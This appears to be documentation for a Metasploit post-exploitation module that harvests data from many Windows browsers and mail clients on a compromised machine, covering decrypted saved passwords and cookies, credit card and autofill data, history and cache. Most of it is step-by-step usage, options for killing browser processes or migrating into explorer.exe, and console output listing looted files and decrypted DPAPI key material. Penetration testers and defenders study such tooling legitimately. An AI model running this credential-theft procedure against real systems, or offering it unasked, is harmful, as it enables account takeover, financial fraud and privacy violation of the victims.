
# Vulnerable Application

This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, credit card information, browser cache and installed extensions.

## Supported Browsers

### Chromium-Based Browsers

- Microsoft Edge
- Google Chrome
- Opera
- Iridium
- Brave
- CentBrowser
- Chedot
- Orbitum
- Comodo Dragon
- Yandex Browser
- 7Star
- Torch
- ChromePlus
- Komet
- Amigo
- Sputnik
- Citrio
- 360Chrome
- Uran
- Liebao
- Elements Browser
- Epic Privacy Browser
- CocCoc Browser
- Sleipnir
- QIP Surf
- Coowon
- Vivaldi

#### Extracted Data

- Login Data (username/passwords, decrypted)
- Cookies (decrypted)
- Browsing History
- Keyword Search History
- Download History
- Autofill Data
- Credit Card Information
- Bookmarks
- Installed Extensions
- Browser Cache

### Gecko-Based Browsers

- Mozilla Firefox
- Thunderbird
- SeaMonkey
- BlackHawk
- Cyberfox
- K-Meleon
- Icecat
- Pale Moon
- Comodo IceDragon
- Waterfox
- Postbox
- Flock Browser

#### Extracted Data

- Login Data (username/passwords)
- Cookies
- Browsing History
- Keyword Search History
- Download History
- Bookmarks
- Installed Extensions
- Browser Cache

## Verification Steps

1. Start `msfconsole`.
2. Obtain a meterpreter session on the target system.
3. Run the module: `use post/windows/gather/enum_browsers`
4. Set the appropriate session ID: `set SESSION <session id>`
5. (Optional) Specify which browser data to extract: `set BROWSER_TYPE <chromium|gecko|all>` (default is `all`).
6. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
7. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
8. (Optional) Extract Browser Cache: `set EXTRACT_CACHE true`
9. (Optional) Migrate the session to `explorer.exe` before extraction: `set USER_MIGRATION true`
10. Run the module: `run`
11. You should see the extracted browser data in the loot files.

## Options

- **KILL_BROWSER** - Kills browser processes before data extraction. This can help avoid file access issues if the browser is running, particularly for cookies. Default is `false`.
- **USER_MIGRATION** - Migrates the session to `explorer.exe` (if available) before extracting data. This ensures the module is run in the user's context, avoiding potential access issues for user-specific data. Default is `false`.
- **BROWSER_TYPE** - Specifies which browser data to extract. The options are:
  - `chromium`: Extracts data only from Chromium-based browsers.
  - `gecko`: Extracts data only from Gecko-based browsers.
  - `all`: Extracts data from both Chromium and Gecko browsers. This is the default setting.
- **EXTRACT_CACHE** - Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
- **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
- **SESSION** - The session to run the module on. Required.

## Example Output

### Normal Session

```bash
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Found Microsoft Edge (Version: 130.0.2849.46)
[+] └ Extracted Passwords to /root/.msf4/loot/20241020211244_default_192.168.0.25_MicrosoftEdge_P_175146.txt (429 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241020211244_default_192.168.0.25_MicrosoftEdge_C_184910.txt (3804 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20241020211246_default_192.168.0.25_MicrosoftEdge_D_377750.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211247_default_192.168.0.25_MicrosoftEdge_A_342470.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211248_default_192.168.0.25_MicrosoftEdge_K_206619.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211248_default_192.168.0.25_MicrosoftEdge_B_745128.txt (1801 bytes)
[+] └ Extracted Extensions to /root/.msf4/loot/20241020211258_default_192.168.0.25_MicrosoftEdge_E_825996.txt (92 bytes)
[*] Found Google Chrome (Version: 129.0.6668.101)
[+] └ Extracted Passwords to /root/.msf4/loot/20241020211300_default_192.168.0.25_GoogleChrome_Pa_111957.txt (77 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211302_default_192.168.0.25_GoogleChrome_Au_349453.txt (140 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211303_default_192.168.0.25_GoogleChrome_Br_232123.txt (694 bytes)
[+] └ Extracted Extensions to /root/.msf4/loot/20241020211310_default_192.168.0.25_GoogleChrome_Ex_885678.txt (93 bytes)
[*] Found Brave (Version: 130.1.71.114)
[+] └ Extracted Passwords to /root/.msf4/loot/20241020211313_default_192.168.0.25_Brave_Passwords_727540.txt (73491 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted Download history to /root/.msf4/loot/20241020211333_default_192.168.0.25_Brave_DownloadH_739572.txt (7456 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241020211334_default_192.168.0.25_Brave_AutofillD_459908.txt (62376 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211353_default_192.168.0.25_Brave_KeywordSe_109050.txt (17259 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211413_default_192.168.0.25_Brave_BrowsingH_992927.txt (1220056 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211413_default_192.168.0.25_Brave_Bookmarks_173688.txt (8544 bytes)
[+] └ Extracted Extensions to /root/.msf4/loot/20241020211430_default_192.168.0.25_Brave_Extensions_472872.txt (689 bytes)
[*] Found Mozilla Firefox (Version: 131.0.3)
[+] └ Extracted Cookies to /root/.msf4/loot/20241020211433_default_192.168.0.25_MozillaFirefox__552779.txt (3948 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20241020211437_default_192.168.0.25_MozillaFirefox__372947.txt (247 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241020211437_default_192.168.0.25_MozillaFirefox__943258.txt (44 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211441_default_192.168.0.25_MozillaFirefox__120866.txt (6693 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211445_default_192.168.0.25_MozillaFirefox__376607.txt (7053 bytes)
[+] └ Extracted Extensions to /root/.msf4/loot/20241020211445_default_192.168.0.25_MozillaFirefox__735144.txt (77 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241020211448_default_192.168.0.25_MozillaFirefox__908275.txt (5671 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241020211449_default_192.168.0.25_MozillaFirefox__878028.txt (7053 bytes)
[*] Found Thunderbird (Version: 115.11.1)
[+] └ Extracted Passwords to /root/.msf4/loot/20241020211452_default_192.168.0.25_Thunderbird_Pass_476857.json (4052 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241020211452_default_192.168.0.25_Thunderbird_Cook_867241.txt (546 bytes)
[+] └ Extracted Extensions to /root/.msf4/loot/20241020211504_default_192.168.0.25_Thunderbird_Exte_041195.txt (77 bytes)
[*] Post module execution completed
```

### Using KILL_BROWSER to Resolve File Access Issues

If the browser processes are running, cookies and other files may be locked and inaccessible. Use the `KILL_BROWSER` option to kill browsers before extraction:

```bash
msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
KILL_BROWSER => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27718). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Found Microsoft Edge (Version: 130.0.2849.27)
[+] └ Extracted Passwords to /root/.msf4/loot/20241011120829_default_192.168.0.25_MicrosoftEdge_P_027160.txt (429 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241011120830_default_192.168.0.25_MicrosoftEdge_C_747617.txt (3646 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20241011120831_default_192.168.0.25_MicrosoftEdge_D_906065.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120832_default_192.168.0.25_MicrosoftEdge_A_383904.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120833_default_192.168.0.25_MicrosoftEdge_K_804941.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120834_default_192.168.0.25_MicrosoftEdge_B_839541.txt (1801 bytes)
[*] Found Google Chrome (Version: 129.0.6668.90)
[+] └ Extracted Passwords to /root/.msf4/loot/20241011120843_default_192.168.0.25_GoogleChrome_Pa_276907.txt (77 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241011120844_default_192.168.0.25_GoogleChrome_Co_757260.txt (2222 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120846_default_192.168.0.25_GoogleChrome_Au_902546.txt (140 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120847_default_192.168.0.25_GoogleChrome_Br_863655.txt (694 bytes)
[*] Found Brave (Version: 129.1.70.126)
[+] └ Extracted Passwords to /root/.msf4/loot/20241011120855_default_192.168.0.25_Brave_Passwords_894306.txt (73491 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241011120857_default_192.168.0.25_Brave_Cookies_123550.txt (217788 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20241011120917_default_192.168.0.25_Brave_DownloadH_237805.txt (7456 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120918_default_192.168.0.25_Brave_AutofillD_954510.txt (62140 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120937_default_192.168.0.25_Brave_KeywordSe_127816.txt (15683 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120957_default_192.168.0.25_Brave_BrowsingH_283083.txt (1112464 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011120957_default_192.168.0.25_Brave_Bookmarks_874720.txt (8544 bytes)
[*] Found Mozilla Firefox (Version: 130.0.1)
[+] └ Extracted Cookies to /root/.msf4/loot/20241011121000_default_192.168.0.25_MozillaFirefox__197951.txt (3948 bytes)
[+] └ Extracted Download history to /root/.msf4/loot/20241011121003_default_192.168.0.25_MozillaFirefox__578520.txt (247 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011121004_default_192.168.0.25_MozillaFirefox__344636.txt (44 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011121008_default_192.168.0.25_MozillaFirefox__470431.txt (6693 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011121011_default_192.168.0.25_MozillaFirefox__924381.txt (7053 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011121014_default_192.168.0.25_MozillaFirefox__314362.txt (5671 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20241011121016_default_192.168.0.25_MozillaFirefox__103888.txt (7053 bytes)
[*] Found Thunderbird (Version: 115.11.1)
[+] └ Extracted Passwords to /root/.msf4/loot/20241011121018_default_192.168.0.25_Thunderbird_Pass_274736.json (4052 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20241011121019_default_192.168.0.25_Thunderbird_Cook_051180.txt (546 bytes)
[*] Post module execution completed
```

This will kill any running browser processes and avoid file access issues.

### Using EXTRACT_CACHE to extract browser cache

Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.

```bash
msf6 post(windows/gather/enum_browsers) > set EXTRACT_CACHE true
EXTRACT_CACHE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Found Microsoft Edge (Version: 130.0.2849.46)
[*] 127 cache files found for Microsoft Edge, total size: 13300 KB
[*] Zipping progress: 10% (13/127 files processed)
[*] Zipping progress: 20% (26/127 files processed)
[*] Zipping progress: 30% (39/127 files processed)
[*] Zipping progress: 40% (52/127 files processed)
[*] Zipping progress: 51% (65/127 files processed)
[*] Zipping progress: 61% (78/127 files processed)
[*] Zipping progress: 71% (91/127 files processed)
[*] Zipping progress: 81% (104/127 files processed)
[*] Zipping progress: 92% (117/127 files processed)
[*] Zipping progress: 100% (127/127 files processed)
[*] Cache for Microsoft Edge zipped to: C:\Users\ah\AppData\Local\Temp\ZqNbEJBi.zip
[+] └ Extracted Cache to /root/.msf4/loot/20241020225508_default_192.168.0.25_MicrosoftEdge_C_443896.zip (8763677 bytes)
```

### Using USER_MIGRATION to Run in User Context

If you want to ensure that the session runs in the user context (e.g., `explorer.exe`) to avoid access issues, enable the `USER_MIGRATION` option:

```bash
msf6 post(windows/gather/enum_browsers) > set USER_MIGRATION true
USER_MIGRATION => true
msf6 post(windows/gather/enum_browsers) > run

[*] Found explorer.exe running with PID: 11520. Attempting migration.
[+] Successfully migrated to explorer.exe (PID: 11520).
[*] Targeting: W00T\ah (IP: 178.238.175.xxx).
[*] Starting data extraction from user profile: C:\Users\ah
...
```

### Using VERBOSE Mode for Detailed Output

If you want to see each step of the extraction and decryption process, enable verbose mode:

```bash
msf6 post(windows/gather/enum_browsers) > set VERBOSE true
VERBOSE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27718). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Found Microsoft Edge (Version: 130.0.2849.27)
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Microsoft\Edge\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb010000001360fe6518ad1d418ddb36d19cea4821100000001e0000004d006900630072006f0073006f00660074002000450064006700650000001066000000010000200000008a876b35ed1a81258c62e3baf7358d2cde10f538d6b20642b0b55873b3aaf9a6000000000e8000000002000020000000160f1c772a381a30045d38466df97d211ccd41dba6a8ae12f5782579752bb50c300000000da6ad4cb58b76db77358cf97724380cdc44f5f3f725c88d0df86c5d67a3a2cb1cbfeb71662480691b2b22e4654c44eb400000005be9574af5e724c4efb41cdcb68aecedb516eb11707514847bcae347ffbf1cea77e5f5ea7d99bfeaefd16d3876438259244e18ce7191c16cc3a74efee0391b58
[*] Starting DPAPI decryption process.
[+] Decryption successful.
[-] Decrypted key is not 32 bytes: 31 bytes
[*] Decrypted key is 31 bytes, attempting to pad key for decryption.
[+] Decrypted key (hex): 6f11fdf3cc97b3923b5363093e57e26612e998cbf4e6ba042f0b9856fa3f1800
[*] Password decryption failed for this entry.
[+] └ Extracted Passwords to /root/.msf4/loot/20241011120519_default_192.168.0.25_MicrosoftEdge_P_417859.txt (429 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted Download history to /root/.msf4/loot/20241011120520_default_192.168.0.25_MicrosoftEdge_D_430841.txt (478 bytes)
[+] └ Extracted Autofill data to /root/.msf4/loot/20241011120521_default_192.168.0.25_MicrosoftEdge_A_791270.txt (1096 bytes)
[+] └ Extracted Keyword search history to /root/.msf4/loot/20241011120522_default_192.168.0.25_MicrosoftEdge_K_691651.txt (26 bytes)
[+] └ Extracted Browsing history to /root/.msf4/loot/20241011120523_default_192.168.0.25_MicrosoftEdge_B_034623.txt (1801 bytes)
[*] Found Google Chrome (Version: 129.0.6668.90)
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Google\Chrome\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f7481e30d117ce48960717a9d8c48ce9100000001c00000047006f006f0067006c00650020004300680072006f006d00650000001066000000010000200000006ff249e1c36007a6743c96f7d6732b7234bf5dd8bf04362fb935c35d4e83d549000000000e80000000020000200000001725cefb3d4c4432431f2dca4c16d4bdcf33a300c1738072e21fdb8b7a2f6203300000007915215d1c3765f2c30ae5d669906e913a851945370c9d5c0549812144b5c90b520183eee2418e70a7a2994c852a72c84000000001ba99c8683fceeb621c74337b1c2adc5e26e7f6c396a6c331ede1498c439357b90014a0645d6175ffcf144d59d36281f875514e7d6f4ff4d1c824dfc3a3d863
[*] Starting DPAPI decryption process.
[+] Decryption successful.
[+] Decrypted key (hex): 3156f00e36d9a79d267974cbeb47579745f7f6d1b5ca834bef3593757597a629
[+] └ Extracted Passwords to /root/.msf4/loot/20241011120527_default_192.168.0.25_GoogleChrome_Pa_522601.txt (77 bytes)
[*] App-Bound encryption detected (v20). Skipping decryption for this entry.
[+] └ Extracted Cookies to /root/.msf4/loot/20241011120528_default_192.168.0.25_GoogleChrome_Co_348174.txt (2222 bytes)
...
```
This will show detailed information, such as:

- The extraction of encryption keys from local state files.
- The decryption of data using DPAPI.
- Success or failure messages for each extraction step.

## Potential Errors

- **Cookies file in use**: If the cookies database is locked by the browser, you may encounter an error message similar to:

  ```bash
  [-] Cannot access Cookies. File in use by another process.
  ```

  You can resolve this by setting `KILL_BROWSER` to `true`.
